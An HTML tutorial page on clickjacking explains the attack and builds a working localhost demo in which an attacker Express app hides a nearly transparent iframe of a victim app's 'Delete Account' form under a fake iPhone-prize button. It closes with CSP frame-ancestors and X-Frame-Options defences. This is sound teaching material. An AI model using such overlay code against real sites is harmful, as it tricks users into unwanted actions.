@@ -1,0 +1,370 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Clickjacking Notes 🛡️</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Nunito:wght@300;400;700;900&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      /* General Setup and Blackish Theme */
+      body {
+        background-color: #1e1e1e; /* Dark background, similar to VS Code */
+        color: #d4d4d4; /* Light text for contrast */
+        font-family: 'Nunito', sans-serif;
+        line-height: 1.6;
+        padding: 20px;
+        margin: 0;
+      }
+
+      /* Container for content */
+      .container {
+        max-width: 900px;
+        margin: 0 auto;
+        background-color: #252526; /* Slightly lighter inner background */
+        padding: 30px;
+        border-radius: 8px;
+        box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
+      }
+
+      /* Headings */
+      h1,
+      h2,
+      h3 {
+        color: #569cd6; /* A common blue in VS Code theme */
+        font-weight: 900;
+        border-bottom: 2px solid #3c3c3c;
+        padding-bottom: 5px;
+        margin-top: 30px;
+      }
+
+      h1 {
+        color: #c586c0; /* A purple for the main title */
+        font-size: 2.2em;
+      }
+
+      h2 {
+        font-size: 1.8em;
+      }
+
+      /* Key definitions and meaning */
+      .definition-box {
+        border-left: 5px solid #dcdcaa; /* Yellow/Gold accent for importance */
+        padding: 15px;
+        margin: 20px 0;
+        background-color: #2d2d30;
+        border-radius: 4px;
+      }
+
+      /* List styling */
+      ul {
+        list-style: disc;
+        padding-left: 20px;
+      }
+
+      li {
+        margin-bottom: 8px;
+        font-weight: 400;
+      }
+
+      /* Inline highlighted text */
+      .highlight {
+        color: #4ec9b0; /* Teal/green for key terms */
+        font-weight: 700;
+      }
+
+      /* Arrows and special characters */
+      .arrow {
+        color: #6a9955; /* Green */
+        font-weight: 700;
+      }
+
+      /* Code Block Styling (VS Code Dark Theme Look) */
+      pre {
+        background-color: #1e1e1e;
+        padding: 15px;
+        border-radius: 4px;
+        overflow-x: auto;
+        font-family: 'Consolas', 'Courier New', monospace; /* Monospace for code */
+        font-size: 0.95em;
+        border: 1px solid #3c3c3c;
+        margin-top: 15px;
+        white-space: pre-wrap; /* Allows wrapping */
+      }
+
+      /* Syntax Highlighting Classes (Mimicking VS Code colors) */
+      .code-tag {
+        color: #569cd6;
+      } /* Blue for tags/keywords */
+      .code-attr {
+        color: #9cd6c2;
+      } /* Light blue/green for attributes */
+      .code-string {
+        color: #ce9178;
+      } /* Orange/Brown for strings */
+      .code-comment {
+        color: #6a9955;
+      } /* Green for comments */
+      .code-func {
+        color: #dcdcaa;
+      } /* Yellow/Gold for functions/methods */
+      .code-keyword {
+        color: #c586c0;
+      } /* Purple for main keywords (import, const, if) */
+      .code-variable {
+        color: #4ec9b0;
+      } /* Teal/green for variables/class names */
+      .code-number {
+        color: #b5cea8;
+      } /* Light green for numbers */
+      .code-operator {
+        color: #d4d4d4;
+      } /* White/Grey for operators */
+      .code-log {
+        color: #f44747;
+      } /* Red for console logs or warnings */
+
+      /* Specific text styles */
+      .run-command {
+        color: #dcdcaa;
+        font-weight: 700;
+      }
+      .port-url {
+        color: #4ec9b0;
+      }
+      .warning {
+        color: #f44747; /* Red for warnings/dangers */
+        font-weight: 700;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>🛡️ What Is Clickjacking? (Clear Definition)</h1>
+
+      <div class="definition-box">
+        <h2>Definition:</h2>
+        <p>
+          Clickjacking is an attack where the victim is tricked into clicking on
+          something different from what they think they are clicking—usually
+          because the real website is hidden inside an
+          <span class="highlight">invisible iframe</span> placed by the
+          attacker.
+        </p>
+      </div>
+
+      <h2>Meaning:</h2>
+      <ul>
+        <li>
+          You think you’re clicking a harmless button
+          <span class="arrow">➡️</span> but actually you're clicking a hidden
+          button on another website (like
+          <span class="highlight">“Delete account”</span>,
+          <span class="highlight">“Send money”</span>,
+          <span class="highlight">“Like this page”</span>).
+        </li>
+      </ul>
+
+      <h3>This works because:</h3>
+      <ul>
+        <li>
+          <span class="highlight">✔</span> attacker loads target website inside
+          an <span class="highlight">iframe</span>
+        </li>
+        <li>
+          <span class="highlight">✔</span> attacker makes it
+          <span class="highlight">transparent</span>
+        </li>
+        <li>
+          <span class="highlight">✔</span> attacker positions
+          <span class="highlight">fake UI</span> over it
+        </li>
+        <li><span class="highlight">✔</span> victim clicks</li>
+        <li>
+          <span class="highlight">✔</span> hidden iframe receives the click
+        </li>
+      </ul>
+
+      <hr />
+
+      <h1>🎯 Why Is Clickjacking Dangerous?</h1>
+      <p>These hidden clicks can trigger:</p>
+      <ul>
+        <li>Bank transactions</li>
+        <li>Changing account settings</li>
+        <li>Following someone on social media</li>
+        <li>Upvoting posts</li>
+        <li>Deleting accounts</li>
+        <li>Allowing permissions</li>
+      </ul>
+      <p>
+        If the user is logged in to the real site, the browser sends cookies
+        <span class="arrow">➡️</span> attack becomes very powerful.
+      </p>
+
+      <hr />
+
+      <h1>🔍 How Clickjacking Works (Step by Step)</h1>
+      <p>Let’s say:</p>
+      <ul>
+        <li>
+          victim website = <span class="port-url">http://localhost:4000</span>
+        </li>
+        <li>
+          attacker website = <span class="port-url">http://localhost:3000</span>
+        </li>
+      </ul>
+
+      <h2>1️⃣ Attacker embeds victim inside an iframe:</h2>
+      <pre>
+<span class="code-tag">&lt;iframe</span> <span class="code-attr">src</span>=<span class="code-string">"http://localhost:4000"</span> <span class="code-attr">style</span>=<span class="code-string">"opacity:0.01; position:absolute; top:0; left:0;"</span><span class="code-tag">&gt;&lt;/iframe&gt;</span>
+    </pre>
+
+      <h2>2️⃣ Attacker shows a fake button:</h2>
+      <pre>
+<span class="code-tag">&lt;button</span> <span class="code-attr">style</span>=<span class="code-string">"z-index:10; position:relative;"</span><span class="code-tag">&gt;</span>
+  Click to win iPhone!<span class="code-tag">&lt;/button&gt;</span>
+    </pre>
+
+      <h2>3️⃣ But the iframe is on top of the button:</h2>
+      <pre>
+<span class="code-tag">iframe</span> <span class="code-operator">{</span>
+  <span class="code-attr">pointer-events</span><span class="code-operator">:</span> <span class="code-variable">auto</span><span class="code-operator">;</span>
+<span class="code-operator">}</span><span class="code-tag">button</span> <span class="code-operator">{</span>
+  <span class="code-attr">pointer-events</span><span class="code-operator">:</span> <span class="code-variable">none</span><span class="code-operator">;</span>
+<span class="code-operator">}</span>
+    </pre>
+      <p>Now the victim thinks they are clicking the fake button…</p>
+      <p>But the click actually goes to the hidden iframe.</p>
+
+      <hr />
+
+      <h1>🚀 Let's Build a REAL Clickjacking Attack (Express.js)</h1>
+      <p>We will create two servers:</p>
+
+      <h2>🧨 Victim App (port 4000)</h2>
+      <p>This simulates a real app with a dangerous button.</p>
+      <p>Create: <span class="highlight">victim.js</span></p>
+      <pre>
+<span class="code-keyword">import</span> <span class="code-variable">express</span> <span class="code-keyword">from</span> <span class="code-string">"express"</span><span class="code-operator">;</span>
+<span class="code-keyword">const</span> <span class="code-variable">app</span> <span class="code-operator">=</span> <span class="code-variable">express</span><span class="code-operator">();</span>
+
+<span class="code-variable">app</span>.<span class="code-func">get</span>(<span class="code-string">"/"</span><span class="code-operator">,</span> <span class="code-operator">(</span><span class="code-variable">req</span><span class="code-operator">,</span> <span class="code-variable">res</span><span class="code-operator">)</span> <span class="code-operator">=></span> <span class="code-operator">{</span>
+  <span class="code-variable">res</span>.<span class="code-func">send</span>(<span class="code-string">`
+    &lt;h1&gt;Victim Website&lt;/h1&gt;
+    &lt;form action="/delete-account" method="POST"&gt;
+      &lt;button style="font-size:24px;"&gt;Delete Account&lt;/button&gt;
+    &lt;/form&gt;
+  `</span>)<span class="code-operator">;</span>
+<span class="code-operator">}</span>)<span class="code-operator">;</span>
+
+<span class="code-variable">app</span>.<span class="code-func">post</span>(<span class="code-string">"/delete-account"</span><span class="code-operator">,</span> <span class="code-operator">(</span><span class="code-variable">req</span><span class="code-operator">,</span> <span class="code-variable">res</span><span class="code-operator">)</span> <span class="code-operator">=></span> <span class="code-operator">{</span>
+  <span class="code-func">console</span>.<span class="code-log">log</span>(<span class="code-string">"⚠️ VICTIM: Account deleted!"</span>)<span class="code-operator">;</span>
+  <span class="code-variable">res</span>.<span class="code-func">send</span>(<span class="code-string">"&lt;h1&gt;Account Deleted!&lt;/h1&gt;"</span>)<span class="code-operator">;</span>
+<span class="code-operator">}</span>)<span class="code-operator">;</span>
+
+<span class="code-variable">app</span>.<span class="code-func">listen</span>(<span class="code-number">4000</span><span class="code-operator">,</span> <span class="code-operator">()</span> <span class="code-operator">=></span> <span class="code-func">console</span>.<span class="code-log">log</span>(<span class="code-string">"Victim running on 4000"</span>))<span class="code-operator">;</span>
+    </pre>
+      <p>Run:</p>
+      <pre class="run-command">
+node victim.js
+    </pre
+      >
+
+      <h2>🎭 Attacker App (port 3000)</h2>
+      <p>Create: <span class="highlight">attacker.js</span></p>
+      <pre>
+<span class="code-keyword">import</span> <span class="code-variable">express</span> <span class="code-keyword">from</span> <span class="code-string">"express"</span><span class="code-operator">;</span>
+<span class="code-keyword">const</span> <span class="code-variable">app</span> <span class="code-operator">=</span> <span class="code-variable">express</span><span class="code-operator">();</span>
+
+<span class="code-variable">app</span>.<span class="code-func">get</span>(<span class="code-string">"/"</span><span class="code-operator">,</span> <span class="code-operator">(</span><span class="code-variable">req</span><span class="code-operator">,</span> <span class="code-variable">res</span><span class="code-operator">)</span> <span class="code-operator">=></span> <span class="code-operator">{</span>
+  <span class="code-variable">res</span>.<span class="code-func">send</span>(<span class="code-string">`
+    &lt;h1&gt;Click here to win a FREE iPhone!&lt;/h1&gt;
+    &lt;button style="font-size:30px; padding:20px; cursor:pointer;"&gt;
+      Claim Reward
+    &lt;/button&gt;
+
+    &lt;iframe 
+      src="http://localhost:4000" 
+      style="
+        position:absolute;
+        top:0; 
+        left:0; 
+        width:400px; 
+        height:400px;
+        opacity:0.01; 
+        z-index:100;
+      "
+    &gt;&lt;/iframe&gt;
+  `</span>)<span class="code-operator">;</span>
+<span class="code-operator">}</span>)<span class="code-operator">;</span>
+
+<span class="code-variable">app</span>.<span class="code-func">listen</span>(<span class="code-number">3000</span><span class="code-operator">,</span> <span class="code-operator">()</span> <span class="code-operator">=></span> <span class="code-func">console</span>.<span class="code-log">log</span>(<span class="code-string">"Attacker running on 3000"</span>))<span class="code-operator">;</span>
+    </pre>
+      <p>Run:</p>
+      <pre class="run-command">
+node attacker.js
+    </pre
+      >
+
+      <hr />
+
+      <h1>🧪 Now Test the Attack</h1>
+      <p>Open attacker page:</p>
+      <pre class="port-url">
+http://localhost:3000
+    </pre
+      >
+      <p>You see:</p>
+      <pre>
+“Click here to win a FREE iPhone!”
+    </pre
+      >
+      <p>Click the button.</p>
+
+      <h3>Behind the scenes:</h3>
+      <ul>
+        <li>
+          Your click goes to the hidden iframe (<span class="port-url"
+            >localhost:4000</span
+          >)
+        </li>
+        <li>It clicks <span class="highlight">Delete Account</span></li>
+        <li>Victim server logs:</li>
+      </ul>
+      <pre class="warning">
+⚠️ VICTIM: Account deleted!
+    </pre
+      >
+      <h2>🎉 You performed real clickjacking!</h2>
+      <p>This is exactly how real attacks work.</p>
+
+      <hr />
+
+      <h1>🔐 How to Protect Against Clickjacking (Express.js)</h1>
+      <p>
+        Use <span class="highlight">X-Frame-Options</span> or
+        <span class="highlight">Content-Security-Policy</span>.
+      </p>
+
+      <h3>✔ Strongest protection (use this):</h3>
+      <pre>
+<span class="code-variable">app</span>.<span class="code-func">use</span>(<span class="code-operator">(</span><span class="code-variable">req</span><span class="code-operator">,</span> <span class="code-variable">res</span><span class="code-operator">,</span> <span class="code-variable">next</span><span class="code-operator">)</span> <span class="code-operator">=></span> <span class="code-operator">{</span>
+  <span class="code-variable">res</span>.<span class="code-func">setHeader</span>(<span class="code-string">"Content-Security-Policy"</span><span class="code-operator">,</span> <span class="code-string">"frame-ancestors 'none'"</span>)<span class="code-operator">;</span>
+  <span class="code-variable">next</span><span class="code-operator">();</span>
+<span class="code-operator">}</span>)<span class="code-operator">;</span>
+    </pre>
+
+      <h3>✔ Or classic header:</h3>
+      <pre>
+<span class="code-variable">app</span>.<span class="code-func">use</span>(<span class="code-operator">(</span><span class="code-variable">req</span><span class="code-operator">,</span> <span class="code-variable">res</span><span class="code-operator">,</span> <span class="code-variable">next</span><span class="code-operator">)</span> <span class="code-operator">=></span> <span class="code-operator">{</span>
+  <span class="code-variable">res</span>.<span class="code-func">setHeader</span>(<span class="code-string">"X-Frame-Options"</span><span class="code-operator">,</span> <span class="code-string">"DENY"</span>)<span class="code-operator">;</span>
+  <span class="code-variable">next</span><span class="code-operator">();</span>
+<span class="code-operator">}</span>)<span class="code-operator">;</span>
+    </pre>
+      <p>This stops attackers from embedding your site in any iframe.</p>
+    </div>
+  </body>
+</html>
